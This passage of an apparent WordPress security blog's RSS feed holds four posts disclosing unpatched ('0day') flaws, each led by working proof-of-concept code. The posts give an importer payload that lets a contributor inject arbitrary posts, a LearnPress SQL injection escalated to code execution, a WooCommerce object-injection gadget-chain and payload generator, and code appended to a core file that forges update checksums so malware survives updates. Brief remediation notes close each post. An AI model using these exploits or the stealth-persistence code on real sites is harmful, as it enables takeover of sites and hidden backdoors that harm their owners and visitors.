		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Thu, 23 Jul 2020 22:24:27 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=169</guid>

					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini) most important one: [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>



<p>Failing could occure because:</p>



<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini)</li><li>most important one: those extensions can&#8217;t parse XML data that holds ascii control characters in it.</li></ul>



<p>In the&nbsp;<code>WXR_Parser_Regex</code>&nbsp;we have following</p>



<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
	// Handle multi-line tags on a singular line
	if ( preg_match( '|&lt;' . $tag . '>(.*?)&lt;/' . $tag . '>|is', $importline, $matches ) ) {
...
</code></pre>



<p>and this means that somewhere in the user input if there is&nbsp;<br><code>&lt; / item &gt;</code>&nbsp;we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towards&nbsp;<code>WXR_Parser_Regex</code>&nbsp;checked and entry point checked, time for demo.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#eli5-poc"></a>Eli5 PoC</h2>



<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value 🙂 Template payload for meta value:</p>



<pre class="wp-block-code"><code lang="xml" class="language-xml">&#x3C;/wp:meta_value&#x3E;&#x3C;/wp:postmeta&#x3E;&#x3C;/item&#x3E;
[asciicontrol]
&#x3C;item&#x3E;
&#x3C;title&#x3E;Attack-Post-1337&#x3C;/title&#x3E;
&#x3C;link&#x3E;http://attack.post/2020/07/19/attack-post/&#x3C;/link&#x3E;
&#x3C;pubDate&#x3E;Sun, 19 Jul 2020 20:57:17 +0000&#x3C;/pubDate&#x3E;
&#x3C;dc:creator&#x3E;attacker&#x3C;/dc:creator&#x3E;
&#x3C;guid isPermaLink=&#x22;false&#x22;&#x3E;http://attack.post?p=1337&#x3C;/guid&#x3E;
&#x3C;description&#x3E;&#x3C;/description&#x3E;
&#x3C;content:encoded&#x3E;&#x3C;!-- wp:paragraph --&#x3E;
&#x3C;p&#x3E;boom jee&#x3C;/p&#x3E;
&#x3C;!-- /wp:paragraph --&#x3E;&#x3C;/content:encoded&#x3E;
&#x3C;excerpt:encoded&#x3E;&#x3C;/excerpt:encoded&#x3E;
&#x3C;wp:post_id&#x3E;1337&#x3C;/wp:post_id&#x3E;
&#x3C;wp:post_date&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date&#x3E;
&#x3C;wp:post_date_gmt&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date_gmt&#x3E;
&#x3C;wp:comment_status&#x3E;open&#x3C;/wp:comment_status&#x3E;
&#x3C;wp:ping_status&#x3E;open&#x3C;/wp:ping_status&#x3E;
&#x3C;wp:post_name&#x3E;attack-post&#x3C;/wp:post_name&#x3E;
&#x3C;wp:status&#x3E;publish&#x3C;/wp:status&#x3E;
&#x3C;wp:post_parent&#x3E;0&#x3C;/wp:post_parent&#x3E;
&#x3C;wp:menu_order&#x3E;0&#x3C;/wp:menu_order&#x3E;
&#x3C;wp:post_type&#x3E;post&#x3C;/wp:post_type&#x3E;
&#x3C;wp:post_password&#x3E;&#x3C;/wp:post_password&#x3E;
&#x3C;wp:is_sticky&#x3E;0&#x3C;/wp:is_sticky&#x3E;
&#x3C;category domain=&#x22;category&#x22; nicename=&#x22;uncategorized&#x22;&#x3E;Uncategorized&#x3C;/category&#x3E;
&#x3C;wp:postmeta&#x3E;
&#x3C;wp:meta_key&#x3E;_test&#x3C;/wp:meta_key&#x3E;
&#x3C;wp:meta_value&#x3E;</code></pre>



<p>prepare this template payload on the following way</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab the content
$cnt = file_get_contents("attack-template.txt");
//add ascii control characters
$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
//url encode it and it is ready to be used towards any meta (custom) field as value
file_put_contents("final-payload.txt", urlencode($cnt));
</code></pre>



<p>and create the meta / custom field as&nbsp;<code>contributor</code>.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=wpdeeply&amp;metavalue=[content_from_final-payload.txt]&amp;_ajax_nonce-add-meta=61b457d48c&amp;post_id=[your_post_id]' --compressed
</code></pre>



<p>Now log in as&nbsp;<code>administrator</code>&nbsp;export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by &nbsp;<code>contributor</code>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#few-facts"></a>Few facts</h2>



<ul><li>Many mainstream plugins accept raw user input in meta / custom fields</li><li>RCE could be achieved without user/attacker interaction when import occurs. <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">Example 1</a> and <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">Example 2</a></li><li><a href="https://wpdeeply.com/wordpress-updates-from-core-and-security/" target="_blank" rel="noreferrer noopener">persistence</a> and <a href="https://github.com/Slavco/wp-weaver" target="_blank" rel="noreferrer noopener">stealth agents</a> planting is 100% option in WP</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#remediation"></a>Remediation</h2>



<ul><li>Sign the posts / data exported and check the signature with data need to be imported</li><li>Follow 101 security practices for web applications</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>LearnPress SQLi to RCE</title>
		<link>https://wpdeeply.com/learnpress-sqli-to-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 21 Jul 2020 21:02:44 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=167</guid>

					<description><![CDATA[Few months back security research regarding WP learning platforms got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE. Eli5 PoC Into function&#160;learn_press_duplicate_post_meta&#160;which is called from&#160;learn_press_duplicate_post&#160;we have the following: From [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Few months back <a href="https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/" target="_blank" rel="noreferrer noopener">security research regarding WP learning platforms</a> got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#eli5-poc"></a>Eli5 PoC</h2>



<p>Into function&nbsp;<code>learn_press_duplicate_post_meta</code>&nbsp;which is called from&nbsp;<code>learn_press_duplicate_post</code>&nbsp;we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">	function learn_press_duplicate_post_meta( $old_post_id, $new_post_id, $excerpt = array() ) {
		global $wpdb;
		$post_meta_infos = $wpdb->get_results( "SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$old_post_id" );
		if ( count( $post_meta_infos ) != 0 ) {
			$excerpt       = array_merge( array( '_edit_lock', '_edit_last' ), $excerpt );
			$excerpt       = apply_filters( 'learn_press_excerpt_duplicate_post_meta', $excerpt, $old_post_id, $new_post_id );
			$sql_query     = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
			$sql_query_sel = array();
			foreach ( $post_meta_infos as $meta ) {
				if ( in_array( $meta->meta_key, $excerpt ) ) {
					continue;
				}
				if ( $meta->meta_key === '_lp_course_author' ) {
					$meta->meta_value = get_current_user_id();
				}
				$meta_key        = $meta->meta_key;
				$meta_value      = addslashes( $meta->meta_value );
				$sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
			}
			$sql_query .= implode( " UNION ALL ", $sql_query_sel );
			$wpdb->query( $sql_query );
		}
	}
</code></pre>



<p>From previous reports&nbsp;<code>$meta_value</code>&nbsp;was reported as SQLi vulnerable parameter, but&nbsp;<code>$meta_key</code>&nbsp;wasn&#8217;t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.setup/wp-admin/admin-ajax.php' --data $'_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=sqli\'payload&amp;metavalue=anything&amp;_ajax_nonce-add-meta=47cfdb164d&amp;post_id=[lesson_id]'
</code></pre>



<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<pre class="wp-block-code"><code class="">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
</code></pre>



<p>What we can achieve with possibility to insert any meta value? Well that depends of plugin itself and WP setup. If we check the LearnPress code then we can notice following in&nbsp;<code>learnpress.php</code>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">require_once 'inc/class-lp-debug.php';
</code></pre>



<p>and this is important because:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function __destruct() {
		if ( ! $this->_handles ) {
			return;
		}
		foreach ( $this->_handles as $handle ) {
			@fclose( $handle );
		}
	}
</code></pre>



<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> => hello RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#few-facts"></a>Few facts</h2>



<ul><li>I tried to warn researchers</li><li>Do not allow interesting gadget chains in your PHP code</li><li>Limit what could be unserialized in your php.ini</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#remediation"></a>Remediation</h2>



<ul><li>Do not allow SQLi in your code <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>Do not trust input</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WooCommerce MySQL replace to RCE</title>
		<link>https://wpdeeply.com/woocommerce-mysql-replace-to-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sat, 18 Jul 2020 23:05:51 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=156</guid>

					<description><![CDATA[This bug is 0day, but same as this bug was reported in the past. Try to fix here&#160;and fix here. Anyway, in the Woo code there is another DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>This bug is 0day, but same as this bug was reported in the past. Try to fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/" target="_blank">here</a>&nbsp;and fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/" target="_blank">here</a>. Anyway, in the Woo code there is <a rel="noreferrer noopener" href="https://github.com/woocommerce/woocommerce/blob/master/includes/class-wc-post-data.php#L169" target="_blank">another</a> DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. See full exploitation via this video.</p>



<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4"></video><figcaption>How to RCE Woo via contributor user role.</figcaption></figure>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#eli5-poc"></a>Eli5 PoC</h2>



<p>In order someone to be able to exploit issue like this, two things are needed.</p>



<ul><li>PHP gadget chain (Woo have one)</li><li>knowledge about data that will be replaced (it is public data in any Woo instance e.g. shown in product page)</li></ul>



<p>Woo PHP gadget chain generator that will survive&nbsp;<code>wc_clean</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">define("WOO_POC_WIZZARD", TRUE);
if (WOO_POC_WIZZARD){
    if ( isset($argv) &amp;&amp; is_array($argv) ){
        if ( sizeof($argv) >= 2 ){
            $call_func = $argv[1];
            $call_func_params = array_slice($argv, 2);
        }else{
            echo "Usage php poc_woo.php print_r input1 input2 ...\n";
            exit();
        }
    }elseif(isset($_REQUEST) &amp;&amp; is_array($_REQUEST) ){
        if (sizeof($_REQUEST) >= 1 &amp;&amp; isset($_REQUEST["func"])) {
            $call_func = $_REQUEST["func"];
            $call_func_params = isset($_REQUEST["param"])?$_REQUEST["param"]:array();
        }else{
            echo "&lt;p>Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&amp;")."param[0]=test".htmlentities("&amp;")."param[1][0]=test2".htmlentities("&amp;")."param[1][1]=test2&lt;/p>";
            exit();
        }
    }
}else{
    echo "Set \$call_func and \$call_func_params by hand here\n";
    /*
     $call_func = "print_r";
     $call_func_params = array(array(1,2,3), "search1", "search2");
     //*/
}
class Requests_Utility_FilteredIterator extends ArrayIterator {
    protected $callback;
    public function __construct($data, $callback) {
        parent::__construct($data);
        $this->callback = $callback;
    }
    public function current() {
        $value = parent::current();
        $value = call_user_func($this->callback, $value);
        return $value;
    }
}
class WC_Log_Handler{
}
class WC_Log_Handler_File extends WC_Log_Handler {
    protected $handles = array();
    function __construct($call_func, $call_func_params){
        //seccond argument e.g. print_r is the function that will be called. Could be any php/wp function
        //each array member from the constructor first argument is the input towards the function
        $this->handles = new Requests_Utility_FilteredIterator($call_func_params, $call_func);
    }
}
//create test object
$test_obj = new WC_Log_Handler_File($call_func, $call_func_params);
//string e.g. serialized object
$serialized_obj = serialize($test_obj);
//make it to go trough filters for control characters like wp text sanitation mechanisms
$serialized_obj = str_replace('s:10:"'."\x00".'*'."\x00".'handles"', 'S:10:"\00\2A\00\68\61\6E\64\6C\65\73"', $serialized_obj);
$serialized_obj = str_replace('s:11:"'."\x00".'*'."\x00".'callback"', 'S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B"', $serialized_obj);
//correct the size of "Requests_Utility_FilteredIterator":_number_: with +22
preg_match('/_FilteredIterator":([0-9]+):/s', $serialized_obj, $found);
$serialized_obj = str_replace($found[0], '_FilteredIterator":'.($found[1]+22).':', $serialized_obj);
//print the test payload
if ( isset($argv) ){
    echo "\n#######payload#######\n";
    echo $serialized_obj."\n";
    echo "#######payload#######\n\n";
}else{
    echo "#######payload#######&lt;br/>";
    echo $serialized_obj."&lt;br/>";
    echo "#######payload#######&lt;br/>";
}
exit();
</code></pre>



<p>this output will be used as input towards final payload generator where we need another constraint: number of bytes that will be added or removed (below script will work for bytes adding and for every number of bytes added payload can be generated)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab it from some payload generator Woo/WP or PHP related 
//https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
$payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';

$payload_prepend = '";i:777;'; //chances to have something similar in real payload are marginal so we can use as starting point
$payload_append  = '}';//to finish the serialized string array in this case
$payload_pre_final = $payload_prepend.$payload_real.$payload_append;

//could be anything - this is for this current Woo case :)
$change_str = 's:6:"pa_boo";s:3:"woo";';

$change_in_bytes_plus = 5;
//todo change in bytes minus

$repeat = 0;
$cnt = 1;
do{
    
    $mod = mb_strlen($payload_pre_final) % $change_in_bytes_plus;
    $repeat = mb_strlen($payload_pre_final) / $change_in_bytes_plus;
    if ( $mod !== 0 ){
        $tmp = '";i:'.str_repeat("7", (3+$cnt)).';';
        $old = '";i:'.str_repeat("7", (3+$cnt-1)).';';
        $payload_pre_final = str_replace($old, $tmp, $payload_pre_final);
    }
    $cnt++;
}while( $mod !== 0);

echo urlencode(str_repeat($change_str, $repeat).$payload_pre_final);
exit();
</code></pre>



<p>Now everything left is to add this payload as item of meta value array and to name it&nbsp;<code>%11_default_attributes</code>&nbsp;(url encoded) in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE {$wpdb->postmeta} SET meta_value = REPLACE( meta_value, %s, %s ) WHERE meta_key = '_default_attributes'...
</code></pre>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#few-facts"></a>Few facts</h2>



<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. &#8211; another core security issue <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#remediation"></a>Remediation</h2>



<ul><li>Put constraints into your php ini regarding serialization</li><li>Sign your content, so any change from outside world will be detected and not processed</li></ul>



<p></p>
]]></content:encoded>
					
		
		<enclosure url="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4" length="29631978" type="video/mp4" />

			</item>
		<item>
		<title>WordPress updates from core and security</title>
		<link>https://wpdeeply.com/wordpress-updates-from-core-and-security/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 17 Jul 2020 22:26:32 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=149</guid>

					<description><![CDATA[WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&#160;update_core&#160;and that is the place where magic is happening. WP core is deciding via&#160;get_core_checksums&#160;what files need to [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&nbsp;<code>update_core</code>&nbsp;and that is the place where magic is happening. WP core is deciding via&nbsp;<code>get_core_checksums</code>&nbsp;what files need to be updated / rewritten and in this function we have this phone home call:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$http_url = 'http://api.wordpress.org/core/checksums/1.0/?' . http_build_query( compact( 'version', 'locale' ), null, '&amp;' );
$url      = $http_url;
...
$response = wp_remote_get( $url, $options );
</code></pre>



<p>e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that &#8220;security&#8221; perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#eli5-poc"></a>Eli5 PoC</h2>



<p>In the&nbsp;<code>ABSPATH . WPINC . '/plugin.php'</code>&nbsp;or any another file included / required after, append the following code:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! function_exists("weaver_phoning_home") &amp;&amp; function_exists("add_filter") ){
    function weaver_phoning_home($response, $parsed_args, $url){
        global $weaver_current_file;
        if ( strpos($url, "api.wordpress.org/core/checksums") !== false ){
            if ( ! is_wp_error( $response ) &amp;&amp; 200 == wp_remote_retrieve_response_code( $response ) ) {
                if ( isset($response["body"]) ){
                    $body = json_decode( trim($response["body"]), true );
                    if ( is_array($body) &amp;&amp; isset($body['checksums']) &amp;&amp; is_array($body['checksums']) ) {
                        $alter_response = false;
                        foreach ( $body['checksums'] as $core_file => $md5checksum ){
                            if ( strpos($weaver_current_file, $core_file) !== false ){
                                $wmd5 = md5_file($weaver_current_file);
                                if ( $md5checksum !== $wmd5 ){
                                    $alter_response = true;
                                    $body['checksums'][$core_file] = $wmd5;
                                }
                            }
                        }
                        if ($alter_response){
                            $response["body"] = json_encode($body);
                            return $response;
                        }
                    }
                }
            }
        }
        return $response;
    }
    $weaver_current_file = __FILE__;
    add_filter('http_response', 'weaver_phoning_home', 1, 4);
}
//malware code below - any length, any logic
if ( isset($_REQUEST["wppply"])){
    exit("deeply");
}
</code></pre>



<p>Hit the update / re-install button, the code will remain in the file, stealth from update mechanism.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#few-facts"></a>Few facts</h2>



<ul><li>This technique will work for core / wp-cli auto-updates / updates / re-install and for every security solution that rely on those functions.</li><li>There are few more places in the WP core where effective meddling with received data is possible</li><li>Two another approaches for WP not detectable malware exists wich will be covered in the next period</li><li>With theme + plugin auto-updates, supply chain attacks will become extremely effective (theme + plugin ownership change)</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#remediation"></a>Remediation</h2>



<ul><li>Turn off auto-updates and don&#8217;t use update / re-install WP options in the name of security</li><li>Server executable files shouldn&#8217;t be writable for server</li></ul>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
